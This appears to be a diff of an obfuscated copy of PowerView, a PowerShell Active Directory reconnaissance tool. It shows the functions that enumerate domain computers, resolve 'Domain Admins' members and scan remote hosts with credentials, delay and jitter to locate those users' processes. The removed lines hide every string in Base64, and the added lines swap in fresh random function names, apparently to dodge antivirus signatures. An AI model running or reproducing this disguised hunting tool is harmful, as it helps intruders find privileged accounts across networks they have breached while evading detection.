-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
         $UserSearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
+            'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
-            $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
+            $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-DomainProcess] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
+            throw '[Find-DomainProcess] No hosts found to enumerate'
         }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU=")))]) {
+        if ($PSBoundParameters['ProcessName']) {
             $TargetProcessName = @()
             ForEach ($T in $ProcessName) {
-                $TargetProcessName += $T.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))
+                $TargetProcessName += $T.Split(',')
             }
             if ($TargetProcessName -isnot [System.Array]) {
                 $TargetProcessName = [String[]] @($TargetProcessName)
             }
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) {
-            $TargetUsers = cqaorm @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
+            $TargetUsers = ykrker @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
             $GroupSearcherArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
+                'Identity' = $UserGroupIdentity
+                'Recurse' = $True
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
             $GroupSearcherArguments
-            $TargetUsers = dfkygh @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            $TargetUsers = yimpvw @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
         
@@ -10731,10 +10735,10 @@ function meumav {
                     
                     
                     if ($Credential) {
-                        $Processes = hypass -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
+                        $Processes = txpefw -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
                     else {
-                        $Processes = hypass -ComputerName $TargetComputer -ErrorAction SilentlyContinue
+                        $Processes = txpefw -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
                     ForEach ($Process in $Processes) {
                         
@@ -10755,10 +10759,10 @@ function meumav {
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
+            Write-Verbose ("[Find-DomainProcess] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -10768,34 +10772,34 @@ function meumav {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                 $Result
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseQ==")))
+                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluUHJvY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))
+            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) = $TargetProcessName
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
+                'ProcessName' = $TargetProcessName
+                'TargetUsers' = $TargetUsers
+                'Credential' = $Credential
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function mqbqrn {
+function hhgtdo {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -10854,7 +10858,7 @@ function mqbqrn {
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),
+        $UserGroupIdentity = 'Domain Admins',
 
         [Alias('AdminCount')]
         [Switch]
@@ -10870,7 +10874,7 @@ function mqbqrn {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -10905,63 +10909,63 @@ function mqbqrn {
 
     BEGIN {
         $UserSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
+            'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) {
-            $TargetUsers = cqaorm @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
+            $TargetUsers = ykrker @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckdyb3VwSWRlbnRpdHk=")))] -or (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy")))])) {
+        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
             
             $GroupSearcherArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
+                'Identity' = $UserGroupIdentity
+                'Recurse' = $True
             }
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckdyb3VwSWRlbnRpdHk6ICRVc2VyR3JvdXBJZGVudGl0eQ==")))
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
